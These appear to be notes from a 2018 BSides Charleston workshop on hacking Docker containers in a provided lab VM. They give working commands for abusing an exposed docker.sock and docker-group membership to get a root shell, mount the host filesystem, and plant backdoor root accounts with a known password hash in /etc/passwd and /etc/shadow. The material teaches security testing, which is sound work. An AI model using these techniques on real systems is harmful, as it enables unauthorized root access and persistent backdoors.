BSides Charleston  
Container Hacking Workshop  
9 November 2018  
Cory Sebol - Secure Ideas  
[https://github.com/ProfessionallyEvil/Pequod](https://github.com/ProfessionallyEvil/Pequod)  
[https://github.com/ProfessionallyEvil/harpoon](https://github.com/ProfessionallyEvil/harpoon)  

### Setup

- Download the VM
- Extract zip archive
- Import .ova into VirtualBox
- Change network adapter of the container to host-only
- Start VM
- Login
    - Username: ahab
    - Password: vagrant

### Container vs. VM

Container:
- Lightweight, isolation
- reproducible
- No hypervisor
- Share kernel with host, host kernel manages resources
- Built from kernel primitives
    - Namespaces
    - Cgroups
    - Seccomp-bpf
- Scalability
VM:
    - Resource-intensive, isolation
    - Hypervisor
    - Separate kernel from host OS

### Docker

Tool to manage, create, interface with containers. Backed by libcontainer (as default driver). Docker CLI communicates with Docker daemon via the docker.sock unix socket.

#### Attack Vectors

- **Exposed docker.sock socket** can receive RESTful messages and relay them to docker daemon (which runs as root)
- **Low privilege user in Docker group** (even a low privilege user can elevate to root access)
- **Exposed container admin services** that use Docker socket to orchestrate, monitor containers

### Demo

Log in to the container (or, SSH from your localhost terminal with `ssh ahab@192.168.56.101`).  
`docker ps` to see docker containers running.

#### 1. Poking the Docker socket

Set up docker sock mount image:  
`docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker_sock_mount`: `--rm` remove once finished, `-v` for vine mount  

Attach to this socket container with  
`docker exec -it docker_sock_mount /bin/bash`: `-it` to get a terminal  
Now you are root on that container:  
Command prompt is `root@933af91f48a3:/#`, where the user is `root` and the hash on the right matches the `docker_sock_mount` container hash from `docker ps`.

Commands we will use today mostly come from the harpoon repo (linked at the top of the document).  
Look for docker cgroup or Cloudfoundry garden cgroup: `grep -E -i ":/docker/|:/garden/" /proc/1/cgroup`  
Look for the docker socket if it was (stupidly) mounted: `find "/" 2>&1 | grep -E "(.*\/docker\.sock|^docker\.sock)$"`

Get ready to mount a container onto the exposed socket:  
```
export CONTAINER_JSON='{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/mnt"}]}'  
curl -s -XPOST -H 'Content-Type: application/json' --unix-socket /run/docker.sock -d $CONTAINER_JSON http://localhost/containers/create
```
This returns the following:  
`{"Id":"f03d118a4febc869969b1e7bf52779fe603add443bae1bd07c2d28fce816aebb","Warnings":null}`  
We will need this ID hash later (e.g. DOCKER\_CONTAINER\_ID="[the hash]"). We can also store the socket path in an environment variable (DOCKER\_SOCK\_PATH="/run/docker.sock").  

Next, let's see if there are any interesting containers.  
`curl -s -XGET --unix-socket /run/docker.sock http://localhost/containers/json 2>&1`  
This returns a JSON description of every container running on the host.  

(Side note: pretty print JSON in vim with `%! python -m json.tool`)

Start the container we created earlier:  
`curl -XPOST --unix-socket /run/docker.sock http://localhost/containers/$DOCKER_CONTAINER_ID/start`   

Now let's attach to it with a shell:  
`socat - UNIX-CONNECT:$DOCKER_SOCK_PATH`  

This command should hang, waiting for us to send it some HTTP headers:
```
POST /containers/$DOCKER_CONTAINER_ID/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
EOM
```

The shell should return the following:
```
HTTP/1.1 101 UPGRADED  
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp
```

Now we've got a shell! Note also by running `id` that we are root. Remember that we mounted the container into `/mnt`. 
We can read all the password hashes: `cat /mnt/etc/passwd`.  
We can add a user and password to backdoor the system:  
```
mkpasswd -m sha-512 -S 12345678 -s <<< password # run this somewhere to get the hash of the password "password"
# this has been done for you and the resulting hash is shown below, echoed into the shadow file

echo 'toor:x:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
echo 'toor:$6$12345678$I8tr4xFAC6/TtjYWdp0LWEjQre2LcYm2jdSMNLQDIyqRv.cKo7KMD5/HpzVVFKpUQlIekr/Vw.OdImtRM85fg/:17697:0:99999:7:::' >> /mnt/etc/shadow
```

Exit the HTTP shell to go back to the container shell, exit back to ahab, and we can `su toor` with our backdoor password. Now we're root! (You can verify this by typing `id` in the resulting command prompt.)

Exit the su shell back to ahab. This machine also has a user `ishmael` with basically no privileges.
```
sudo su ishmael # don't need password because he's in ahab's su list, but if you want to know, his password is moby
cat /etc/shadow #this fails because he has no privileges
id
groups #aha! He's in the docker group! (second attack vector)
```

Now let's connect to the container with the mounted filesystem from before.  
```
docker run --rm -it -v /:/mnt ubuntu
echo 'ruut:x:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
echo 'ruut:$6$12345678$I8tr4xFAC6/TtjYWdp0LWEjQre2LcYm2jdSMNLQDIyqRv.cKo7KMD5/HpzVVFKpUQlIekr/Vw.OdImtRM85fg/:17697:0:99999:7:::' >> /mnt/etc/shadow
exit

su ruut 
# enter the backdoored password
# we're a root user again!
id
```

Exit back to `ahab`.
```
docker ps
```
Now try to exploit the `docker_php_app` container.

#### Learn more
Twitter: @84d93r  
Email: cory@secureideas.com  
Blog: blog.secureideas.com  
Upcoming container hacking webcast: [wwww.secureideas.com/classes/index.html](wwww.secureideas.com/classes/index.html)  
